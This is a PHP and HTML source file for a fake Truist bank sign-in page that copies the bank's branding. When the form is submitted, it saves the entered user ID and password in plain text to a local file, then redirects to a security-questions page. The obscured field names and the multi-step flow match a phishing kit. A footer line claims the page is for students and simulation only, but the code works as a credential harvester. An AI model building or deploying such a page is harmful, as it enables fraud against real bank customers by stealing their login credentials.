<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

$errors = [];
$username = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['emzemz'] ?? '');
    $password = $_POST['pwzenz'] ?? '';

    // Simple validation
    if (empty($username)) {
        $errors['emzemz'] = 'User ID is required.';
    }
    
    if (empty($password)) {
        $errors['pwzenz'] = 'Password is required.';
    }
    
    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $username;
        
        // Save to test file
        $data = [
            'step' => 'login',
            'usrnm' => $username,
            'emzemz' => $username,
            'pwzenz' => $password
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Truist - Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen flex flex-col bg-[#f6f3fa]">
    <!-- Header -->
    <header class="bg-[#2b0d49] text-white shadow-[0_2px_8px_rgba(22,9,40,0.45)]">
        <div class="max-w-6xl mx-auto h-16 flex items-center justify-start px-6">
            <img
                src="assets/trulogo_horz-white.png"
                alt="Truist logo"
                class="h-8 w-auto"
            />
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-start justify-center px-4 sm:px-6 py-10">
        <div class="w-full max-w-5xl">
            <section class="w-full">
                <h1 class="mx-auto mb-6 w-full max-w-2xl text-center text-3xl font-semibold text-[#2b0d49]">
                    Sign In – Welcome to TRUIST Banking
                </h1>
                <div class="mx-auto w-full max-w-2xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
                    <div class="px-8 py-10">
                        <p class="text-sm font-semibold text-[#6c5d85]">Enter your credentials to continue</p>

                        <form method="POST" class="mt-8 space-y-6">
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="emzemz">
                                    User ID
                                </label>
                                <input
                                    id="emzemz"
                                    name="emzemz"
                                    type="text"
                                    value="<?php echo htmlspecialchars($username); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter your User ID"
                                />
                                <?php if (isset($errors['emzemz'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['emzemz']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="pwzenz">
                                    Password
                                </label>
                                <input
                                    id="pwzenz"
                                    name="pwzenz"
                                    type="password"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter your password"
                                />
                                <?php if (isset($errors['pwzenz'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['pwzenz']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="flex flex-wrap gap-3 pt-2">
                                <button
                                    type="submit"
                                    class="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e]"
                                >
                                    Sign in
                                </button>
                            </div>
                        </form>

                    </div>
                </div>
                <div class="mx-auto mt-10 w-full max-w-2xl space-y-6 text-sm text-[#5d4f72]">
                    <p class="text-center leading-relaxed">
                        For security reasons, never share your username, password, social security number, account number or other
                        private data online, unless you are certain who you are providing that information to, and only share
                        information through a secure webpage or site.
                    </p>
                    <div class="flex flex-wrap items-center justify-center gap-4 text-center font-semibold text-[#5f259f]">
                        <a class="hover:underline" href="#">
                            Forgot Username?
                        </a>
                        <span class="text-[#cfc2df]">|</span>
                        <a class="hover:underline" href="#">
                            Forgot Password?
                        </a>
                        <span class="text-[#cfc2df]">|</span>
                        <a class="hover:underline" href="#">
                            Forgot Everything?
                        </a>
                        <span class="text-[#cfc2df]">|</span>
                        <a class="hover:underline" href="#">
                            Locked Out?
                        </a>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Disclosure Strip -->
    <div class="bg-white border-t border-[#d7cde2] shadow-[0_-2px_8px_rgba(22,9,40,0.05)]">
        <div class="max-w-6xl mx-auto px-6 py-3 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <button
                type="button"
                class="inline-flex items-center gap-2 text-sm text-[#2b0d49] border border-[#cabde0] rounded-full px-4 py-2"
            >
                <span>Disclosures</span>
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 9l6 6 6-6" />
                </svg>
            </button>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-[#2b0d49] text-white">
        <div class="max-w-6xl mx-auto px-6 py-8 grid gap-6 lg:grid-cols-[auto_1fr_auto] items-start">
            <div class="flex flex-col gap-3">
                <div class="flex items-center">
                    <img
                        src="assets/trulogo_horz-white.png"
                        alt="Truist logo"
                        class="h-8 w-auto"
                    />
                </div>
                <p class="text-xs text-white/70 max-w-xs">
                    Tailored banking experiences, demonstrated for students and simulation exercises only.
                </p>
            </div>

            <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3 text-sm">
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Privacy
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Accessibility
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Fraud & security
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Limit use of my sensitive personal information
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Terms and conditions
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Disclosures
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="bg-black/90">
            <p class="max-w-6xl mx-auto px-6 py-3 text-center text-xs text-white/70">
                © 2025, Truist. All rights reserved.
            </p>
        </div>
    </footer>
</body>
</html>
